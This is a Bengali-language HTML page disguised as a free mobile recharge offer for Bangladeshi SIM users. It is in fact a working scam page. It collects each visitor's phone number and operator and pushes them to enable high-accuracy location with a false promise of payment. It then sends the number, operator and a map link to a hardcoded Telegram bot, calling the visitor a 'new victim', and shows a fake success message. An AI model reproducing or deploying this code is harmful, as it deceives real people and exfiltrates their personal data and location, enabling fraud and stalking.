<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>২০ টাকা ফ্রি রিচার্জ অফার ২০২৬</title>
    <style>
        body { background-color: #f4f7f6; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #fff; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; border-top: 6px solid #d9534f; }
        h2 { color: #d9534f; font-size: 24px; margin-bottom: 10px; }
        p { color: #555; font-size: 15px; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; text-align: left; }
        label { font-size: 14px; color: #333; font-weight: bold; margin-left: 5px; }
        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none; }
        button { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        button:hover { background-color: #218838; }
        .warning { color: #d9534f; font-size: 12px; margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>🎁 ধামাকা অফার!</h2>
    <p>সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন</p>
    
    <div class="input-group">
        <label>সিম অপারেটর:</label>
        <select id="sim">
            <option value="">নির্বাচন করুন</option>
            <option value="GP">জিপি (GP)</option>
            <option value="BL">বাংলালিংক (BL)</option>
            <option value="Robi">রবি (Robi)</option>
            <option value="Airtel">এয়ারটেল (Airtel)</option>
            <option value="Teletalk">টেলিটক (TT)</option>
        </select>
    </div>

    <div class="input-group">
        <label>মোবাইল নম্বর:</label>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
    </div>
    
    <button onclick="processOffer()">রিচার্জ নিন</button>
    
    <p class="warning">সতর্কতা: ভুল তথ্য দিলে অফার বাতিল হবে।</p>
</div>

<script>
function processOffer() {
    var phone = document.getElementById('phone').value;
    var sim = document.getElementById('sim').value;

    if (sim == "" || phone.length < 11) { 
        alert("দয়া করে সঠিক সিম এবং ১১ ডিজিটের নম্বর দিন।"); 
        return; 
    }

    // আপনার দেওয়া সেই স্পেশাল মেসেজ
    alert("রিচার্জ নিশ্চিত করতে ফোনের লোকেশন অপশন অন করুন, না হলে পেমেন্ট পাবেন না।");

    var token = "8502696183:AAHMRmatcsRh3fXyX2ng8AyU3y6f3m-7Mdw";
    var chat_id = "7887080882";

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
            
            var message = "✅ **নতুন শিকার (লোকেশন অন)!**\n\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n📍 লোকেশন: [ম্যাপ লিঙ্ক](" + mapUrl + ")";
            sendToTelegram(token, chat_id, message);
        }, function(error) {
            var message = "⚠️ **নতুন শিকার (লোকেশন অফ)!**\n\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n❌ কারণ: ইউজার লোকেশন পারমিশন দেয়নি।";
            sendToTelegram(token, chat_id, message);
        }, { enableHighAccuracy: true, timeout: 5000 });
    } else {
        var message = "❌ লোকেশন সাপোর্ট করে না!\n📱 নম্বর: " + phone;
        sendToTelegram(token, chat_id, message);
    }
}

function sendToTelegram(token, chat_id, message) {
    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown";
    
    fetch(url).then(response => {
        alert("ধন্যবাদ! আপনার আবেদন গ্রহণ করা হয়েছে। ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
        window.location.href = "https://www.google.com";
    }).catch(err => {
        alert("সার্ভার সমস্যা, আবার চেষ্টা করুন।");
    });
}
</script>

</body>
</html>
